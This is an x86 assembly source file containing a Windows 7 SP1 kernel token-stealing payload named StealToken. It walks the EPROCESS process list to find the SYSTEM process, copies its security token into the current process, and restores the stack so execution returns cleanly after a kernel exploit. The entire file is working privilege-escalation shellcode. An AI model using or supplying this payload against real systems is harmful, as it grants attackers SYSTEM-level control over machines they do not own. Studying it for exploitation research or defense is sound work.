.386
.model flat, c ; cdecl / stdcall
ASSUME FS:NOTHING
.code
PUBLIC StealToken
StealToken   proc

pushad                              ; Save registers state

; Start of Token Stealing Stub
xor eax, eax                        ; Set ZERO
mov eax, DWORD PTR fs:[eax + 124h]  ; Get nt!_KPCR.PcrbData.CurrentThread
                                    ; _KTHREAD is located at FS : [0x124]

mov eax, [eax + 50h]                ; Get nt!_KTHREAD.ApcState.Process
mov ecx, eax                        ; Copy current process _EPROCESS structure
mov edx, 04h                        ; WIN 7 SP1 SYSTEM process PID = 0x4

SearchSystemPID:
mov eax, [eax + 0B8h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub eax, 0B8h
cmp[eax + 0B4h], edx                ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov edx, [eax + 0F8h]               ; Get SYSTEM process nt!_EPROCESS.Token
mov[ecx + 0F8h], edx                ; Replace target process nt!_EPROCESS.Token
                                    ; with SYSTEM process nt!_EPROCESS.Token
; End of Token Stealing Stub

popad                               ; Restore registers state

; We still need to reconstruct a valid response
xor eax, eax                        ; Set NTSTATUS SUCCEESS

; Recreate the instructions that would've been executed if we didn't ruin the stack frame
pop ebp								; Restore saved EBP
ret 8								; Return cleanly

StealToken ENDP
end